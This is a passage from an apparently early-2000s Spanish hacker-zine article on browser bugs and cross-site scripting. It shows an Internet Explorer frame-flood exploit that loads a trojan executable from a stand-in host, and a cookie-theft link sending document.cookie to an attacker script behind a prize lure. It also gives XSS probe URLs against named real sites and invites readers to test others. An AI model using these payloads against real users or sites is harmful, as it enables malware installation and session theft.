+<FRAME SRC="http://www.ejemplo.com/ruta/000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000000000000000000000000000000000000.exe"></FRAME>
+
+   + Solucion:
+
+  Actualizar a la ultima version de Opera o parchear si es que existe parche.
+
+ -+ <B> +- Flood en I.E. 6.
+
+   + Aviso oficial:
+
+  "Flooding Internet Explorer 6.0.2800 (6.x?) security zones"
+
+  http://www.securityfocus.com/archive/1/321532
+
+   + Explicacion:
+
+  Este bug es simple, consiste en hacer un flood de llamadas a programas
+  locales de manera automatica, usando frames y luego llamar a determinado
+  codigo que queremos que sea ejecutado.
+
+   + Exploit:
+
+<FRAME SRC="C:\windows\notepad.exe"></FRAME>
+<FRAME SRC="C:\windows\regedit.exe"></FRAME>
+
+<!-- otras 191 llamadas a programas y despues  
+     llamamos al cogigo que queremos que sea
+     ejecutado -->
+
+<FRAME SRC="http://ejemplo.org/yo/mitr0y4n0.exe"></FRAME>
+<FRAME SRC="http://ejemplo.org/yo/mitr0y4n0.exe"></FRAME>
+<FRAME SRC="http://ejemplo.org/yo/mitr0y4n0.exe"></FRAME>
+<FRAME SRC="http://ejemplo.org/yo/mitr0y4n0.exe"></FRAME>
+<FRAME SRC="http://ejemplo.org/yo/mitr0y4n0.exe"></FRAME>
+
+   + Solucion:
+
+     Actualizar a la ultima version de ie o esperar a que se publique un
+     parche para esta vulnerabilidad. Aunque la mejor opcion siempre es
+     usar otro cliente mejor like netscape/mozilla u opera ;).
+
+ -+ <C> +- Robo de cookies.
+
+ No iva a dejar sin explicar el tipico ejemplo de robo de cookies. 
+
+<A href="javascript:document.location.replace('http://ejemplo.com/
+ ladron.php?'+document.cookie)">Gana un millon de euritos YA!</A>
+
+ Esta linea javascript enviara a nuestro script 'ladron.php' la cookie
+ robada, y ladron.php debera ser un script que almacene las cookies
+ robadas :). Lo demas ya se sabe...
+
+ ++ Mas para explotar:
+
+   http://www.securityfocus.com/archive/1/320981
+   http://www.securityfocus.com/archive/1/314748
+   http://www.securityfocus.com/archive/1/314644
+   http://www.idefense.com/advisory/03.19.03.txt
+   http://www.securityfocus.com/archive/1/319813
+   http://www.securityfocus.com/archive/1/319814
+   http://packetstormsecurity.nl/0304-advisories/ie-heap1.txt
+   http://packetstormsecurity.nl/0305-advisories/secuniaOpera.txt
+   http://security.greymagic.com/adv/gm013-ie/
+   http://security.greymagic.com/adv/gm014-ie/
+   http://security.greymagic.com/adv/gm004-ie/
+
+
+ 6.3 - Errores en sitios conocidos.
+ _____________________________________________________  _____  ____ ___ __ _
+	
+ ++ Buscador de msn.es :
+
+ http://search.msn.es/results.aspx?q=<script>alert('yeah')</script>
+
+ ++ Buscador de ya.com :
+
+ http://buscador.ya.com/scripts/busqueda?cat=0&D=all&SS=ya&query=&it=&SC=
+ 1&S_IT=0&palabras=all&SE=C&TE=&item=<script>alert('yeah')</script>&submit2=
+ +Buscar+ 
+
+ ++ Muchisimos otros mas. Solo teneis que probar.
+
+ ++ Tambien he descubierto errores en sitios mas delicados; tiendas,
+    ministerios, proveedores de correo, etcetera... Por motivos obvios
+    he preferido no publicarlos, simplemente los he reportado.
+
+ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+ Tener una web dinamica conlleva sus riesgos, por lo que es preciso
+ establecer unos limites de control y confianza respecto al usuario y tomar
+ las medidas preventivas necesarias para evitar las consecuencias descritas.
+ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+ _____________________________________________________  _____  ____ ___ __ _
+|   /   /
+|  / 7 / Enlaces y recursos.
+|_/___/_______________________________________________  _____  ____ ___ __ _
+
+
+ He aqui algunos de los documentos que han inspirado y han ayudado a
+ desarrollar este texto, y algunos lugares de internet que considero de
+ interes:
+
+ ~  http://www.crosszone.org/ -- Listado de sitios importantes con errores
+                                 XSS. Aspecto google :).
+
+ ~  http://www.cgisecurity.com/articles/xss-faq.shtml
+ ~  http://www.perl.com/pub/a/2002/02/20/css.html
+ ~  http://www.cert.org/advisories/CA-2000-02.html
+ ~  http://www.cert.org/tech_tips/malicious_code_FAQ.html
+ ~  http://www.cert.org/tech_tips/malicious_code_mitigation.html
+ ~  http://www.cert.org/tech_tips/cgi_metacharacters.html
+ ~  http://spoor12.edup.tudelft.nl/SkyLined/index.php
+ ~  http://httpd.apache.org/info/css-security/
+ ~  http://b0iler.eyeonsecurity.org/tutorials/
+ ~  http://www.microsoft.com/technet/security/topics/crssite.asp
+ ~  http://www.argo.es/~jcea/artic/hispasec52.htm
+ ~  http://www.owasp.org/
+
+ ~  http://httpd.apache.org/info/css-security/apache_1.3.11_css_patch.txt
+
+    Parche para la version 1.3.11 e inferiores de Apache que previene
+    este tipo de ataques. En las versiones posteriores a la 1.3.11 no es
+    necesario parchear :).
+
+ ~  DTF zine #4 0x11 - Traduccion de "Bypassing the JavaScript filters: The
+    flash attack." original de eyeon security. (http://dtfzine.cjb.net/)
+
+ ~  "Professional Apache Security" por Tony Mobily et al.
+      ISBN: 1861007760 
+
+ ~  http://x0und.fompi.com/ - x0und rocks!
+
+ Disculpas por los errores. Este articulo esta dedicado a Mireia, decoder,
+ el rey de los quelonios, iam, ^oscurito y ergosum :).
+
+
+
+0x00
